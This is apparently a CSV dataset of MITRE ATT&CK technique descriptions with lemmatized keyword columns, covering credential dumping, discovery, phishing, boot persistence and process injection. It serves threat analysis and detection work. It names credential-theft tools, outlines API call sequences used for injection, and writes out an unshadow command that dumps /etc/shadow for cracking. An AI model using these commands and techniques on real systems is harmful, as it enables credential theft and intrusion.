T1003.003,OS Credential Dumping: NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.Volume Shadow Copy secretsdump.py Using the in-built Windows tool, ntdsutil.exe Invoke-NinjaCopy",adversary attempt access create copy active directory domain database order steal credential information obtain information domain member device user access right default ntds file locate domain controller addition look ntds file active domain controllers adversary search backup contain similar information following tool technique enumerate ntds file content entire active directory hash volume shadow copy build windows tool invoke ninjacopy
T1003.004,OS Credential Dumping: LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.Reg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",adversary system access host attempt access local security authority lsa secret contain variety different credential material credential service account reg extract registry mimikatz extract secret memory
T1003.005,OS Credential Dumping: Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.With SYSTEM access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py can be used to extract the cached credentials.Note: Cached credentials for Windows Vista are derived using PBKDF2.",adversary attempt access cache domain credential allow authentication occur event domain controller unavailable windows vista new hash format domain cached credentials version hash know ms cache hash system access tool utility mimikatz reg extract cache credential note cache credential windows vista derive
T1003.006,OS Credential Dumping: DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API) to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password dataDCSync functionality has been included in the ""lsadump"" module in Mimikatz.",adversary attempt access credential sensitive information abuse windows domain controller application programming interface api simulate replication process remote domain controller technique call dcsync member administrators domain admins enterprise admin group computer account domain controller able run dcsync pull password datadcsync functionality include lsadump module mimikatz
T1003.007,OS Credential Dumping: Proc Filesystem,"Adversaries may gather credentials from the proc filesystem or /proc. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the /proc/<PID>/maps file shows how memory is mapped within the process’s virtual address space. And /proc/<PID>/mem, exposed for debugging purposes, provides access to the process’s virtual address space.When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.If running as or with the permissions of a web browser, a process can search the /maps & /mem locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",adversary gather credential proc filesystem proc filesystem pseudo filesystem interface kernel data structure linux base system manage virtual memory process file show memory map process virtual address space expose debugging purpose provide access process virtual address space execute root privilege adversary search memory location process system contain pattern indicative credential look fix string memory structure cache hash run privileged access process view virtual memory location service program save credential clear text inside process memory run permission web browser process search location common website credential pattern find adjacent memory structure hash cleartext credential locate
T1003.008,OS Credential Dumping: /etc/passwd and /etc/shadow,"Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db",adversary attempt dump content passwd shadow enable offline password cracking modern linux operate system use combination passwd shadow store user account information include password hash shadow default shadow readable root user linux utility unshadow combine file format suit password cracking utility john ripper bin unshadow passwd shadow
T1201,Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS .",adversary attempt access detailed information password policy enterprise network cloud environment password policy way enforce complex password difficult guess crack brute force information help adversary create list common password launch dictionary brute force attack adhere policy minimum password length try password check password account lockout set lock policy set discover windows linux macos system command shell utility net account addefaultdomainpasswordpolicy chage cat common password pwpolicy getaccountpolicie password policy discover cloud environment available api getaccountpasswordpolicy aws
T1120,Peripheral Device Discovery,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",adversary attempt gather information attach peripheral device component connect computer system peripheral device include auxiliary resource support variety functionality keyboard printer camera smart card reader removable storage information enhance awareness system network environment action
T1069,Permission Groups Discovery,"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.",adversary attempt discover group permission setting information help adversary determine user account group available membership user particular group user group elevated permission adversary attempt discover group permission setting different way data provide adversary information compromised environment follow activity targeting
T1069.001,Permission Groups Discovery: Local Groups,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such as net localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.",adversary attempt find local system group permission setting knowledge local system permission group help adversary determine group exist user belong particular group adversary use information determine user elevated permission user find local administrator group command net localgroup net utility dscl macos group linux list local group
T1069.002,Permission Groups Discovery: Domain Groups,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such as net group /domain of the Net utility, dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups.",adversary attempt find domain level group permission setting knowledge domain level permission group help adversary determine group exist user belong particular group adversary use information determine user elevated permission domain administrator command net group net utility dscacheutil group macos ldapsearch linux list domain level group
T1069.003,Permission Groups Discovery: Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.With authenticated access there are several tools that can be used to find permissions groups. The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command az ad user get-member-groups will list groups associated to a user account for Azure while the API endpoint GET https://cloudidentity.googleapis.com/v1/groups lists group resources available to a user for Google.Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS GetBucketAcl API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",adversary attempt find cloud group permission setting knowledge cloud permission group help adversary determine particular role user group environment user associate particular group authenticate access tool find permission group msolrole powershell cmdlet obtain role permission group exchange office account cli az cli google cloud identity provider api provide interface obtain permission group command az ad user member group list group associate user account azure api endpoint list group resource available user google adversary attempt list acl object determine owner account access object example aws getbucketacl api information adversary target account permission give object leverage account compromise access object
T1566,Phishing,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,",adversary send phishing message gain access victim system form phishing electronically deliver social engineering phishing target know spearphishing spearphishing specific individual company industry target adversary generally adversary conduct non targeted phishing mass malware spam campaign adversary send victim email contain malicious attachment link typically execute malicious code victim system phishing conduct party service like social medium platform phishing involve social engineering technique pose trust source evasive technique remove manipulate email metadata header compromised account abuse send message email hiding rule victim receive phishing message instruct phone number direct visit malicious url download malware
T1566.001,Phishing: Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",adversary send spearphishing email malicious attachment attempt gain access victim system spearphishing attachment specific variant spearphishing spearphishing attachment different form spearphishing employ use malware attach email form spearphishing electronically deliver social engineering target specific individual company industry scenario adversary attach file spearphishing email usually rely user execution gain execution spearphishing involve social engineering technique pose trust source option attachment microsoft office document executable pdf archive file open attachment potentially click past protection adversary payload exploit vulnerability directly execute user system text spearphishing email usually try plausible reason file open explain bypass system protection order email contain instruction decrypt attachment zip file password order evade email boundary defense adversary frequently manipulate file extension icon order attached executable appear document file file exploit application appear file different
T1566.002,Phishing: Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to Steal Application Access Tokens.",adversary send spearphishing email malicious link attempt gain access victim system spearphishing link specific variant spearphishing different form spearphishing employ use link download malware contain email instead attach malicious file email avoid defense inspect email attachment spearphishing involve social engineering technique pose trust source form spearphishing electronically deliver social engineering target specific individual company industry case malicious email contain link generally link accompany social engineering text require user actively click copy paste url browser leverage user execution visit website compromise web browser exploit user prompt download application document zip file executable depend pretext email place adversary include link intend interact directly email reader include embed image intend exploit end system directly additionally adversary use seemingly benign link abuse special character mimic legitimate website know idn homograph utilize link perform consent phishing typically oauth request url accept user provide permission access malicious application allow adversary steal application access tokens
T1566.003,Phishing: Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",adversary send spearphishing message party service attempt gain access victim system spearphishing service specific variant spearphishing different form spearphishing employ use party service directly enterprise email channel form spearphishing electronically deliver social engineering target specific individual company industry scenario adversary send message social medium service personal webmail non enterprise control service service likely strict security policy enterprise kind spearphishing goal generate rapport target target interest way adversary create fake social medium account message employee potential job opportunity allow plausible reason ask service policy software run environment adversary send malicious link attachment service common example build rapport target social medium send content personal webmail service target use work computer allow adversary bypass email restriction work account target likely open file expect payload work expect adversary continue normal communication troubleshoot target work
T1598,Phishing for Information,"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules).",adversary send phishing message elicit sensitive information targeting phishing information attempt trick target divulge information frequently credential actionable information phishing information different phishing objective gather datum victim execute malicious code form phishing electronically deliver social engineering phishing target know spearphishing spearphishing specific individual company industry target adversary generally adversary conduct non targeted phishing mass credential harvesting campaign adversary try obtain information directly exchange email instant message electronic conversation mean phishing information frequently involve social engineering technique pose source reason collect information ex establish account compromise account send multiple seemingly urgent message way accomplish forge spoof phishing information involve evasive technique remove manipulate email metadata header compromised account abuse send message email hiding rule
T1598.001,Phishing for Information: Spearphishing Service,"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.",adversary send spearphishing message party service elicit sensitive information targeting spearphishing information attempt trick target divulge information frequently credential actionable information spearphishing information frequently involve social engineering technique pose source reason collect information ex establish account compromise account send multiple seemingly urgent message form spearphishing electronically deliver social engineering target specific individual company industry scenario adversary send message social medium service personal webmail non enterprise control service service likely strict security policy enterprise kind spearphishing goal generate rapport target target interest way adversary create fake social medium account message employee potential job opportunity allow plausible reason ask service policy information environment adversary use information previous reconnaissance effort ex social media search victim own websites craft persuasive believable lur
T1598.002,Phishing for Information: Spearphishing Attachment,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",adversary send spearphishing message malicious attachment elicit sensitive information targeting spearphishing information attempt trick target divulge information frequently credential actionable information spearphishing information frequently involve social engineering technique pose source reason collect information ex establish account compromise account send multiple seemingly urgent message form spearphishing electronically deliver social engineering target specific individual company industry scenario adversary attach file spearphishing email usually rely recipient populate information return file text spearphishing email usually try plausible reason file fill request information business associate adversary use information previous reconnaissance effort ex search open websites domain search victim own website craft persuasive believable lur
T1598.003,Phishing for Information: Spearphishing Link,"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site.Adversaries may also link to ""web bugs"" or ""web beacons"" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.Adversaries may also be able to spoof a complete website using what is known as a ""browser-in-the-browser"" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",adversary send spearphishing message malicious link elicit sensitive information targeting spearphishing information attempt trick target divulge information frequently credential actionable information spearphishing information frequently involve social engineering technique pose source reason collect information ex establish account compromise account send multiple seemingly urgent message form spearphishing electronically deliver social engineering target specific individual company industry scenario malicious email contain link generally accompany social engineering text coax user actively click copy paste url browser give website clone legitimate site online corporate login portal closely resemble legitimate site appearance url contain element real site adversary link web bug web beacon phishing message verify receipt email potentially profile track victim information ip address adversary able spoof complete website know browser browser bitb attack generate fake browser popup window html base address bar appear contain legitimate url authentication portal able prompt user enter credential bypass typical url verification method fake website information gather web form send adversary adversary use information previous reconnaissance effort ex search open websites domains search victim own websites craft persuasive believable lur
T1647,Plist File Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).For example, adversaries can add a malicious application path to the ~/Library/Preferences/com.apple.dock.plist file, which controls apps that appear in the Dock. Adversaries can also modify the LSUIElement key in an application’s info.plist file to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as LSEnvironment, to enable persistence via Dynamic Linker Hijacking.",adversary modify property list file plist file enable malicious activity potentially evade bypass system defense macos application use plist file file store property configuration setting inform operate system handle application runtime plist file structure metadata key value pair format xml base apple core foundation dtd plist file save text binary format adversary modify key value pair plist file influence system behavior hide execution application hidden window run additional command persistence ex launch agent launch daemon open example adversary add malicious application path preference file control app appear dock adversary modify lsuielement key application file run app background adversary insert key value pair insert environment variable lsenvironment enable persistence dynamic linker hijacking
T1542,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",adversary abuse pre os boot mechanism way establish persistence system booting process computer firmware startup service load operate system program control flow execution operate system take control adversary overwrite datum boot driver firmware bios basic input output system unified extensible firmware interface uefi persist system layer operate system particularly difficult detect malware level detect host software base defense
T1542.001,Pre-OS Boot: System Firmware,"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",adversary modify system firmware persist system bios basic input output system unified extensible firmware interface uefi extensible firmware interface efi example system firmware operate software interface operate system hardware computer system firmware like bios underly functionality computer modify adversary perform assist malicious activity capability exist overwrite system firmware sophisticated adversary means install malicious firmware update means persistence system difficult detect
T1542.002,Pre-OS Boot: Component Firmware,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",adversary modify component firmware persist system adversary employ sophisticated mean compromise computer component install malicious firmware execute adversary code outside operate system main system firmware bios technique similar system firmware conduct system component device capability level integrity checking malicious component firmware provide persistent level access system despite potential typical failure maintain access hard disk image way evade host software base defense integrity check
T1542.003,Pre-OS Boot: Bootkit,"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",adversary use bootkit persist system bootkit reside layer operate system difficult perform remediation organization suspect act accordingly bootkit malware variant modify boot sector hard drive include master boot record mbr volume boot record vbr mbr pass control boot process vbr similar case mbr adversary raw access boot drive overwrite vbr divert execution startup adversary code
T1542.004,Pre-OS Boot: ROMMONkit,"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",adversary abuse rom monitor rommon load unauthorized firmware adversary code provide persistent access manipulate device behavior difficult detect rommon cisco network device firmware function boot loader boot image boot helper initialize hardware software platform power reset similar tftp boot adversary upgrade rommon image locally remotely example tftp adversary code restart device order overwrite exist rommon image provide adversary mean update rommon gain persistence system way difficult detect
T1542.005,Pre-OS Boot: TFTP Boot,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image.",adversary abuse netbooting load unauthorized network device operate system trivial file transfer protocol tftp server tftp boot netbooting commonly network administrator load configuration control network device image centralized management server netbooting option boot sequence centralize manage control device image adversary manipulate configuration network device specify use malicious tftp server conjunction modify system image load modify image device startup reset unauthorized image allow adversary modify device configuration add malicious capability device introduce backdoor maintain control network device minimize detection use standard functionality technique similar rommonkit result network device run modify image
T1057,Process Discovery,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.On network devices, Network Device CLI commands such as show processes can be used to display current running processes.",adversary attempt information run process system information obtain gain understanding common software application run system network adversary use information process discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action windows environment adversary obtain detail run process tasklist utility cmd process powershell information process extract output native api call mac linux accomplish ps command adversary opt enumerate process network device network device cli command process display current run process
T1055,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",adversary inject code process order evade process base defense possibly elevate privilege process injection method execute arbitrary code address space separate live process run code context process allow access process memory system network resource possibly elevated privilege execution process injection evade detection security product execution mask legitimate process different way inject code process abuse legitimate functionality implementation exist major os typically platform specific sophisticated sample perform multiple process injection segment module evade detection utilize name pipe inter process communication ipc mechanism communication channel
T1055.001,Process Injection: Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL). Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary). Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject dynamic link library dll process order evade process base defense possibly elevate privilege dll injection method execute arbitrary code address space separate live process dll injection commonly perform write path dll virtual address space target process load dll invoke new thread write perform native windows api call virtualallocex writeprocessmemory invoke createremotethread call loadlibrary api responsible load dll variation method reflective dll injection write self map dll process memory module map dll write process overcome address relocation issue additional api invoke execution method load execute file memory manually preform function loadlibrary variation method refer module stomping overloading dll hollowing leverage conceal inject code process method involve load legitimate dll remote process manually overwrite module addressofentrypoint start new thread target process run code context process allow access process memory system network resource possibly elevated privilege execution dll injection evade detection security product execution mask legitimate process
T1055.002,Process Injection: Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject portable executable pe process order evade process base defense possibly elevate privilege pe injection method execute arbitrary code address space separate live process pe injection commonly perform copy code file disk virtual address space target process invoke new thread write perform native windows api call virtualallocex writeprocessmemory invoke createremotethread additional code ex shellcode displacement inject code introduce additional requirement functionality remap memory reference run code context process allow access process memory system network resource possibly elevated privilege execution pe injection evade detection security product execution mask legitimate process
T1055.003,Process Injection: Thread Execution Hijacking,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code hijack process order evade process base defense possibly elevate privilege thread execution hijacking method execute arbitrary code address space separate live process thread execution hijacking commonly perform suspend exist process unmappe hollow memory replace malicious code path dll handle exist victim process create native windows api call openthread point process suspend write realign inject code resume suspendthread virtualallocex writeprocessmemory setthreadcontext resumethread respectively similar process hollowing target exist process create process suspend state run code context process allow access process memory system network resource possibly elevated privilege execution thread execution hijacking evade detection security product execution mask legitimate 